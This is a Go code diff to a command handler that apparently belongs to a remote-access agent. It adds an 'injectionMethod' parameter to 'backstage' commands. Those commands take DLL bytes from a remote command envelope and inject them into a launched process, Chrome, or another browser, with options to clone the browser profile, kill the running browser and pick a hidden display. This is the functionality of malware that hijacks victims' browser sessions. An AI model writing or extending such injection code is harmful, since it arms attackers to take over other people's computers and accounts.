@@ -2013,6 +2013,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		searchPath := ""
 		replacePath := ""
 		display := 0
+		injectionMethod := ""
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				filePath = v
@@ -2026,16 +2027,19 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["display"].(float64); ok {
 				display = int(v)
 			}
+			if v, ok := payload["injectionMethod"].(string); ok {
+				injectionMethod = v
+			}
 		}
 		dllBytes := extractDLLBytes(payload)
 		if len(dllBytes) == 0 {
 			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
 			return nil
 		}
-		log.Printf("backstage: start process injected %q search=%q replace=%q display=%d dllSize=%d", filePath, searchPath, replacePath, display, len(dllBytes))
+		log.Printf("backstage: start process injected %q search=%q replace=%q display=%d method=%q dllSize=%d", filePath, searchPath, replacePath, display, injectionMethod, len(dllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("backstage_start_process_injected", nil, func() {
-			if _, err := capture.StartbackstageProcessInjected(filePath, dllBytes, searchPath, replacePath, display); err != nil {
+			if _, err := capture.StartbackstageProcessInjected(filePath, dllBytes, searchPath, replacePath, display, injectionMethod); err != nil {
 				log.Printf("backstage: injected process failed for %q: %v", filePath, err)
 			}
 		})
@@ -2044,9 +2048,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "backstage_start_chrome_injected":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		chromePath := ""
+		injectionMethod := ""
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				chromePath = v
+			}
+			if v, ok := payload["injectionMethod"].(string); ok {
+				injectionMethod = v
 			}
 		}
 		dllBytes := extractDLLBytes(payload)
@@ -2054,10 +2062,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
 			return nil
 		}
-		log.Printf("backstage: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
+		log.Printf("backstage: start chrome injected path=%q method=%q dllSize=%d", chromePath, injectionMethod, len(dllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("backstage_start_chrome_injected", nil, func() {
-			if err := capture.StartbackstageChromeInjected(chromePath, dllBytes); err != nil {
+			if err := capture.StartbackstageChromeInjected(chromePath, dllBytes, injectionMethod); err != nil {
 				log.Printf("backstage: chrome injected failed: %v", err)
 			}
 		})
@@ -2071,6 +2079,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		cloneLite := false
 		killIfRunning := false
 		display := 0
+		injectionMethod := ""
 		if payload != nil {
 			if v, ok := payload["browser"].(string); ok {
 				browser = v
@@ -2090,6 +2099,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["display"].(float64); ok {
 				display = int(v)
 			}
+			if v, ok := payload["injectionMethod"].(string); ok {
+				injectionMethod = v
+			}
 		}
 		dllBytes := extractDLLBytes(payload)
 		if len(dllBytes) == 0 {
@@ -2100,7 +2112,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no browser specified")
 			return nil
 		}
-		log.Printf("backstage: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v display=%d dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, display, len(dllBytes))
+		log.Printf("backstage: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v display=%d method=%q dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, display, injectionMethod, len(dllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("backstage_start_browser_injected", nil, func() {
 			var onProgress capture.CloneProgressFunc
@@ -2137,7 +2149,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Detail:  detail,
 				})
 			}
-			if err := capture.StartbackstageBrowserInjected(browser, exePath, dllBytes, clone, cloneLite, killIfRunning, display, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
+			if err := capture.StartbackstageBrowserInjected(browser, exePath, dllBytes, clone, cloneLite, killIfRunning, display, injectionMethod, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
 				log.Printf("backstage: browser injected failed for %q: %v", browser, err)
 			}
 		})
